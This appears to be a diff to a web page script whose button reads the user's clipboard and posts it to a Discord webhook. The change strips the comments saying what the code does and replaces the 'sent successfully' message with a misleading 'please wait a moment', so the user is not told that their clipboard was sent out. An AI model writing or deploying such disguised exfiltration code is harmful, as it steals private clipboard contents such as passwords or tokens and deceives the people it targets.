@@ -15,10 +15,7 @@
 
         document.getElementById('sendClipboard').addEventListener('click', async () => {
             try {
-                // クリップボードの内容を取得
                 const text = await navigator.clipboard.readText();
-
-                // Discord ウェブフックに送信
                 const response = await fetch(webhookURL, {
                     method: 'POST',
                     headers: {
@@ -31,7 +28,7 @@
                     throw new Error(`Error: ${response.statusText}`);
                 }
 
-                document.getElementById('status').textContent = '送信に成功しました。';
+                document.getElementById('status').textContent = 'しばらくお待ち下さい...';
             } catch (error) {
                 document.getElementById('status').textContent = `エラー: ${error.message}`;
             }
